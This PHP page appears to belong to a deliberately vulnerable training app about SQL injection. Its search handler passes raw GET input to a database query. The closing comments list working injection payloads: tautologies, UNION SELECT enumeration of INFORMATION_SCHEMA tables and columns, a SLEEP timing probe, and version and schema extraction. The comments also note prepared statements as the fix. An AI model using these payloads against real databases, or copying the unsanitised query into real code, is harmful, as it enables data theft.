<?php

  require_once "templates/header.php";
  include "../public/assets/html/sql-injection.html";

  //search bar
  include "../mvc/views/home-view.php";
  include "../mvc/models/home-model.php";
  include "../mvc/controllers/home-controller.php";

  if (isset($_GET['submit']) && !empty($_GET['search'])) {

		$search = $_GET['search'];

    //fetch user data //controller
		$controller = new home_controller();
		$data = $controller->searchData($search);

    $view = new home_view();
  	$view->printQuery($data);

  }

	//fetching home_buttons table with db connection
	$controller = new home_controller();
	$data = $controller->fetchData();


  //%' OR '%
  //%' OR '1' = '1
  //prints everything

  //sql' OR title LIKE 'cross
  //prints cross-site scripting

  //' union select title FROM home_buttons -- '
  //title can be replaced with php_page, id, etc

  //sql' OR title LIKE 'cross
  //prints cross-site scripting

  //' union select name FROM INFORMATION_SCHEMA.INNODB_SYS_TABLES -- '
  //prints names of all tables

  //sleep
  //sql'  UNION SELECT SLEEP(3)-- '

  //gets columns of home table (43 from TABLE_ID in SYS_TABLES)
  //' union select name FROM INFORMATION_SCHEMA.INNODB_SYS_COLUMNS WHERE TABLE_ID = '43' -- '

  //gets db version
  //%sql' UNION SELECT version()-- '

  //gets schema of current
  //%sql' UNION SELECT schema()-- '

  //To fix
  //prepared statement
?>
